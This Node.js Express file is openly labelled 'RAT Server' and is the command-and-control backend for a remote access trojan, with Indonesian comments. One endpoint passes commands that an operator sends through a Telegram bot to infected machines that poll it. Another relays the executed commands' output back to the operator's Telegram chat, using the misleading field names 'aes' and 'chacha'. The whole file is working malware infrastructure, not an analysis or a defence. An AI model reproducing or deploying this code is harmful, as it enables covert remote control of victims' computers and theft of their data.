const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN_B; // Token Bot B (Command)
const CHAT_ID = process.env.CHAT_ID;

// 1. Endpoint Polling (Malware nanya: "Ada tugas?")
app.post('/poll', async (req, res) => {
    try {
        // Cek update terakhir di Telegram
        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`;
        const response = await axios.get(tgUrl);
        const updates = response.data.result;

        if (updates.length > 0) {
            const lastMsg = updates[0].message.text;
            // Jika diawali /cmd, kirim ke malware
            if (lastMsg && lastMsg.startsWith('/cmd ')) {
                return res.json({ 
                    status: "command", 
                    cmd: lastMsg.replace('/cmd ', '') 
                });
            }
        }
        return res.json({ status: "idle" });
    } catch (e) {
        res.json({ status: "error" });
    }
});

// 2. Endpoint Laporan Hasil (Malware lapor: "Ini hasil command-nya")
app.post('/report', async (req, res) => {
    try {
        const { id, aes, chacha } = req.body; // aes = output command, chacha = command aslinya
        
        const message = `
💻 **CMD RESULT**
Command: \`${chacha}\`
Output:
\`\`\`
${aes}
\`\`\`
        `;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        
        res.json({ status: 'success' });
    } catch (e) {
        res.status(500).json({ status: 'error' });
    }
});

app.listen(PORT, () => console.log(`RAT Server running on port ${PORT}`));
